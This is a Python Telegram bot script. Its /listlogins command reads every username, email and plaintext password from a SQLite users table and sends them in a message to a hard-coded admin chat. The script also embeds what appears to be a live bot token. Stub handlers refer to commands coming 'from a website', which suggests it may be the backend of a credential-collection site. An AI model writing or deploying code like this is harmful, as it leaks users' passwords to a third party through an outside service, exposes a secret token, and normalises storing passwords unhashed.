import logging
from telegram import Update
from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, CallbackContext
import sqlite3
from flask import Flask
import os

# Set up logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Initialize Flask app to share database configuration
app = Flask(__name__)
app.config['DATABASE'] = 'database.db'
app.config['TELEGRAM_BOT_TOKEN'] = '8435439233:AAG9bmCOM9C95ITnFz-ltx3Y4uulau0UnbI'
app.config['ADMIN_CHAT_ID'] = '7092629860'  # For /listlogins command

def get_db():
    db = sqlite3.connect(app.config['DATABASE'])
    db.row_factory = sqlite3.Row
    return db

def start(update: Update, context: CallbackContext) -> None:
    update.message.reply_text('Bot is running. Use /listlogins to get user data.')

def list_logins(update: Update, context: CallbackContext) -> None:
    # Verify this is coming from an admin
    if str(update.message.chat_id) != app.config['ADMIN_CHAT_ID']:
        update.message.reply_text('Unauthorized')
        return
    
    db = get_db()
    try:
        # Get all users
        users = db.execute('SELECT username, email, password FROM users').fetchall()
        
        if not users:
            update.message.reply_text('No users found')
            return
        
        response = "User Logins:\n\n"
        for user in users:
            response += f"Username: {user['username']}\nEmail: {user['email']}\nPassword: {user['password']}\n\n"
        
        update.message.reply_text(response)
    except Exception as e:
        logger.error(f"Error listing logins: {e}")
        update.message.reply_text('Error fetching logins')
    finally:
        db.close()

def handle_pair_command(update: Update, context: CallbackContext) -> None:
    # This would handle the /pair commands from the website
    pass

def handle_delpair_command(update: Update, context: CallbackContext) -> None:
    # This would handle the /delpair commands from the website
    pass

def main() -> None:
    updater = Updater(app.config['TELEGRAM_BOT_TOKEN'])
    dispatcher = updater.dispatcher
    
    # Command handlers
    dispatcher.add_handler(CommandHandler("start", start))
    dispatcher.add_handler(CommandHandler("listlogins", list_logins))
    
    # Message handlers
    dispatcher.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_pair_command))
    
    updater.start_polling()
    updater.idle()

if __name__ == '__main__':
    main()
